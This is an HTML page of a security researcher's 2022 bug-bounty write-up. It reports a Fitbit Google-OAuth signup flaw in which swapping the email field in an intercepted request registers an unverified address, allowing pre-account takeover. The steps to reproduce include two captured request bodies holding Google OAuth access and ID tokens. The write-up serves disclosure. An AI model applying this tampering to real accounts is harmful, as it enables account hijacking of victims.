<!doctype html><html lang=en>
<head>
<title>
Unauthorization of Oauth Token Leads to Pre Account Takeover without Verifying üçÇ ::
0xdroopy ‚Äî Lets Hack for Good!
</title><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Summary #  On Fitbit official website I was able to register with any account without verifying the email because of the vulnerability Broken Authentication. This was due to the unauthorization of the Oauth token with respect to the email address which was being transferred to the server.
Functionalities #  On fitbit.com there are 2 functionalities to register in the account. One is normal functionality of email address and password whereas other is the functionality of Oauth by which you can register using your google account.">
<meta name=keywords content>
<meta name=robots content="noodp">
<link rel=canonical href=https://bugs.0xdroopy.live/bugs/bugreporthidden/>
<link rel=stylesheet href=https://bugs.0xdroopy.live/assets/style.css>
<link rel=stylesheet href=https://bugs.0xdroopy.live/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://bugs.0xdroopy.live/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=https://bugs.0xdroopy.live/img/favicon.png>
<link href=https://bugs.0xdroopy.live/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://bugs.0xdroopy.live/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://bugs.0xdroopy.live/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://bugs.0xdroopy.live/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://bugs.0xdroopy.live/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=https://bugs.0xdroopy.live/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary">
<meta name=twitter:title content=" Unauthorization of Oauth Token Leads to Pre Account Takeover without Verifying üçÇ">
<meta name=twitter:description content="Summary #  On Fitbit official website I was able to register with any account without verifying the email because of the vulnerability Broken Authentication. This was due to the unauthorization of the Oauth token with respect to the email address which was being transferred to the server.
Functionalities #  On fitbit.com there are 2 functionalities to register in the account. One is normal functionality of email address and password whereas other is the functionality of Oauth by which you can register using your google account.">
<meta property="og:title" content=" Unauthorization of Oauth Token Leads to Pre Account Takeover without Verifying üçÇ">
<meta property="og:description" content="Summary #  On Fitbit official website I was able to register with any account without verifying the email because of the vulnerability Broken Authentication. This was due to the unauthorization of the Oauth token with respect to the email address which was being transferred to the server.
Functionalities #  On fitbit.com there are 2 functionalities to register in the account. One is normal functionality of email address and password whereas other is the functionality of Oauth by which you can register using your google account.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://bugs.0xdroopy.live/bugs/bugreporthidden/"><meta property="article:section" content="bugs">
<meta property="article:published_time" content="2022-03-08T00:00:00+00:00">
<meta property="article:modified_time" content="2022-03-08T00:00:00+00:00"><meta property="og:site_name" content="0xdroopy">
</head><body>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=https://home.0xdroopy.live class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>root@0xdroopy</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/bugs>post</a></li></ul><ul class="menu__inner menu__inner--mobile">
<li><a href=/bugs>post</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header><div class=content>
<div class=post>
<h1 class=post-title>Unauthorization of Oauth Token Leads to Pre Account Takeover without Verifying üçÇ</h1><div class=post-meta>
<span class=post-date>
2022-03-08
</span>
<span class=post-author>‚Äî Written by 0xdroopy</span>
</div><div class=post-content>
<h2 id=summary>
Summary
<a href=#summary class=h-anchor aria-hidden=true>#</a>
</h2><p>On Fitbit official website I was able to register with any account without verifying the email because of the vulnerability Broken Authentication. This was due to the unauthorization of the Oauth token with respect to the email address which was being transferred to the server.</p><img src=https://miro.medium.com/max/1400/1*3z3zxJj_GzArgT2SIy529w.png alt="Hello Friend" class=center style=border-radius:8px>
<h2 id=functionalities>
Functionalities
<a href=#functionalities class=h-anchor aria-hidden=true>#</a>
</h2><p>On fitbit.com there are 2 functionalities to register in the account. One is normal functionality of email address and password whereas other is the functionality of Oauth by which you can register using your google account. In the Oauth functionality, after logging through you would be directly be logged in to the account. Whereas in the normal functionality, you have to verify the email in order to go for further registration of details.</p><h3 id=functionalities-on-register-page>
Functionalities On Register Page
<a href=#functionalities-on-register-page class=h-anchor aria-hidden=true>#</a>
</h3><img src=https://i.ibb.co/0C7Y3Nm/1.png alt="Hello Friend" class=center style=border-radius:8px>
<h3 id=when-try-to-register-using-normal-functionality>
When Try to Register Using Normal Functionality
<a href=#when-try-to-register-using-normal-functionality class=h-anchor aria-hidden=true>#</a>
</h3><img src=https://i.ibb.co/bKdmRKZ/2.png alt="Hello Friend" class=center style=border-radius:8px>
<h2 id=the-unauthorization-of-oauth-token>
The Unauthorization of Oauth Token
<a href=#the-unauthorization-of-oauth-token class=h-anchor aria-hidden=true>#</a>
</h2><p>By logging through the Oauth Functionality, accounts.google.com sends the Oauth Token to the website who requested to be logged in using Google Functionality. Then the website authorize the token and thus extracts the email address fromit. The authorization of the Oauth Token and the Email Address go step by step till the end of the registration of the account. At the end the server uses the cookies same as the oauth token being provided for further logins.</p><img src=https://i.ibb.co/NytTGVh/3.png alt="Hello Friend" class=center style=border-radius:8px>
<h2 id=steps-to-reproduce>
Steps To Reproduce
<a href=#steps-to-reproduce class=h-anchor aria-hidden=true>#</a>
</h2><ol>
<li>
<p>Make Two New Google Accounts and name them as Account 1 and Account 2.</p></li><li>
<p>Go to <a href=https://accounts.fitbit.com/signup>https://accounts.fitbit.com/signup</a> and now login with the Account 1 using Google Oauth Functionality.</p></li><li>
<p>Now after clicking next put your height , weight etc. and Start intercepting the requests.</p></li><li>
<p>After that Click Submit and in the burp suite change the email address from Account 1 to Account 2.</p></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>email<span style=color:#f92672>=</span>testemailaddressforfit1%40gmail.com&amp;password<span style=color:#f92672>=</span>asuidahsdhaw&amp;birthday<span style=color:#f92672>=</span>2006-03-08&amp;emailSubscribe<span style=color:#f92672>=</span>true&amp;firstName<span style=color:#f92672>=</span>Test&amp;lastName<span style=color:#f92672>=</span>Account&amp;gender<span style=color:#f92672>=</span>MALE&amp;height<span style=color:#f92672>=</span>185.42&amp;heightUnit<span style=color:#f92672>=</span>en_US&amp;weight<span style=color:#f92672>=</span>65&amp;weightUnit<span style=color:#f92672>=</span>METRIC&amp;locale<span style=color:#f92672>=</span>en_US&amp;localeLang<span style=color:#f92672>=</span>en&amp;localeCountry<span style=color:#f92672>=</span>United+States&amp;timezone<span style=color:#f92672>=</span>Asia%2FKolkata&amp;legalTermsAccepted<span style=color:#f92672>=</span>true&amp;googleUID<span style=color:#f92672>=</span>107045151452751939515&amp;googleAccessToken<span style=color:#f92672>=</span>ya29.A0ARrdaM8eNFf87_O5ah4jQzQLQl8J7Guj7lcAvJul7Sae0OAAniUF-OSCYN4dbXNeLFxMNk-8EyfhbdiT9BlbIgujPCDPK3qqq0nWNjg_IUuEjAmTQgyZpdk6MQQsVzeTHEugRxsqFxjmXi8OEvxiC1bkOr4y&amp;googleIdToken<span style=color:#f92672>=</span>eyJhbGciOiJSUzI1NiIsImtpZCI6ImQ2M2RiZTczYWFkODhjODU0ZGUwZDhkNmMwMTRjMzZkYzI1YzQyOTIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJhY2NvdW50cy5nb29nbGUuY29tIiwiYXpwIjoiNjI1NTg1NTMyODc3LW01dGgyMjEzZG5xcTZwNzIyZXNxN2hia2F2cmxpOXNkLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiYXVkIjoiNjI1NTg1NTMyODc3LW01dGgyMjEzZG5xcTZwNzIyZXNxN2hia2F2cmxpOXNkLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwic3ViIjoiMTA3MDQ1MTUxNDUyNzUxOTM5NTE1IiwiZW1haWwiOiJ0ZXN0ZW1haWxhZGRyZXNzZm9yZml0MUBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXRfaGFzaCI6IlpyQ2YyR09ZSVM3MENxVGszRlE1TkEiLCJpYXQiOjE2NDY3NDUzMDQsImV4cCI6MTY0Njc0ODkwNH0.qipJa4CC2UDuR8hzW0mIRtJ1-w3xPXZlY_UriCsCK86PcjrZYQ0O3W3FjXYYCel-Vv2LZg_20Qa7sb1vVgy5lceQR7QnUSWBMZoCUEkqaXfTZ8NAyF_Bm3inneDJRkLPuQxwJQRbA0PCqUew7b-Z2OZ10KeqzJqalYstjkAJMXnbd_UTwGdx8d8cdQxJ3dni-5boPvejaoj2qkOzriUYaqrQNZN3Z-UrE_5dV8ux98zAK8ejK3BRquZ0mPWpf_p48QrMYKec7QLahH4rDE1wq4tdQPJz5EZLtcEAwx9IlNKijzjyhKPSdNjRn7zlPxPL5Pqcf7e99gToq5Bjr0GK3w&amp;client_id<span style=color:#f92672>=</span>228TQF
</span></span></code></pre></div><p>To -</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>email<span style=color:#f92672>=</span>testemailaddressforfit2%40gmail.com&amp;password<span style=color:#f92672>=</span>asuidahsdhaw&amp;birthday<span style=color:#f92672>=</span>2006-03-08&amp;emailSubscribe<span style=color:#f92672>=</span>true&amp;firstName<span style=color:#f92672>=</span>Test&amp;lastName<span style=color:#f92672>=</span>Account&amp;gender<span style=color:#f92672>=</span>MALE&amp;height<span style=color:#f92672>=</span>185.42&amp;heightUnit<span style=color:#f92672>=</span>en_US&amp;weight<span style=color:#f92672>=</span>65&amp;weightUnit<span style=color:#f92672>=</span>METRIC&amp;locale<span style=color:#f92672>=</span>en_US&amp;localeLang<span style=color:#f92672>=</span>en&amp;localeCountry<span style=color:#f92672>=</span>United+States&amp;timezone<span style=color:#f92672>=</span>Asia%2FKolkata&amp;legalTermsAccepted<span style=color:#f92672>=</span>true&amp;googleUID<span style=color:#f92672>=</span>107045151452751939515&amp;googleAccessToken<span style=color:#f92672>=</span>ya29.A0ARrdaM8eNFf87_O5ah4jQzQLQl8J7Guj7lcAvJul7Sae0OAAniUF-OSCYN4dbXNeLFxMNk-8EyfhbdiT9BlbIgujPCDPK3qqq0nWNjg_IUuEjAmTQgyZpdk6MQQsVzeTHEugRxsqFxjmXi8OEvxiC1bkOr4y&amp;googleIdToken<span style=color:#f92672>=</span>eyJhbGciOiJSUzI1NiIsImtpZCI6ImQ2M2RiZTczYWFkODhjODU0ZGUwZDhkNmMwMTRjMzZkYzI1YzQyOTIiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJhY2NvdW50cy5nb29nbGUuY29tIiwiYXpwIjoiNjI1NTg1NTMyODc3LW01dGgyMjEzZG5xcTZwNzIyZXNxN2hia2F2cmxpOXNkLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwiYXVkIjoiNjI1NTg1NTMyODc3LW01dGgyMjEzZG5xcTZwNzIyZXNxN2hia2F2cmxpOXNkLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwic3ViIjoiMTA3MDQ1MTUxNDUyNzUxOTM5NTE1IiwiZW1haWwiOiJ0ZXN0ZW1haWxhZGRyZXNzZm9yZml0MUBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXRfaGFzaCI6IlpyQ2YyR09ZSVM3MENxVGszRlE1TkEiLCJpYXQiOjE2NDY3NDUzMDQsImV4cCI6MTY0Njc0ODkwNH0.qipJa4CC2UDuR8hzW0mIRtJ1-w3xPXZlY_UriCsCK86PcjrZYQ0O3W3FjXYYCel-Vv2LZg_20Qa7sb1vVgy5lceQR7QnUSWBMZoCUEkqaXfTZ8NAyF_Bm3inneDJRkLPuQxwJQRbA0PCqUew7b-Z2OZ10KeqzJqalYstjkAJMXnbd_UTwGdx8d8cdQxJ3dni-5boPvejaoj2qkOzriUYaqrQNZN3Z-UrE_5dV8ux98zAK8ejK3BRquZ0mPWpf_p48QrMYKec7QLahH4rDE1wq4tdQPJz5EZLtcEAwx9IlNKijzjyhKPSdNjRn7zlPxPL5Pqcf7e99gToq5Bjr0GK3w&amp;client_id<span style=color:#f92672>=</span>228TQF
</span></span></code></pre></div><ol start=5>
<li>After Forwarding the request , you would be successfully signed up with the Account 2 Email address without verifying.</li></ol><img src=https://i.ibb.co/pn3r3qw/4.png alt="Hello Friend" class=center style=border-radius:8px>
<h2 id=demonstration>
Demonstration
<a href=#demonstration class=h-anchor aria-hidden=true>#</a>
</h2><p><a href=https://img.youtube.com/vi/DjbVqwm3DtI/0.jpg>IMAGE_ALT</a>](<a href="https://www.youtube.com/watch?v=DjbVqwm3DtI">https://www.youtube.com/watch?v=DjbVqwm3DtI</a>)</p><h2 id=attack-scenario>
Attack Scenario
<a href=#attack-scenario class=h-anchor aria-hidden=true>#</a>
</h2><p>Here attack scenario is very clear, the attacker can easily register with any account he wanted to and hijack it without confirming the email address which would lead to a pre-account takeover. This can make the attacker change everything in the account and giving the victim only way to recover account via password reset.</p></div></div></div><footer class=footer>
<div class=footer__inner>
<a href=https://home.0xdroopy.live class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>root@0xdroopy</span>
<span class=logo__cursor></span>
</a>
<div class=copyright>
<span>¬© 2022 Powered by
<a href=https://gohugo.io target=_blank rel=noopener>Hugo</a></span>
<span>Theme created by
<a href=https://twitter.com/panr target=_blank rel=noopener>panr</a></span>
</div></div></footer><script src=https://bugs.0xdroopy.live/assets/main.js></script>
<script src=https://bugs.0xdroopy.live/assets/prism.js></script>
</div></body></html>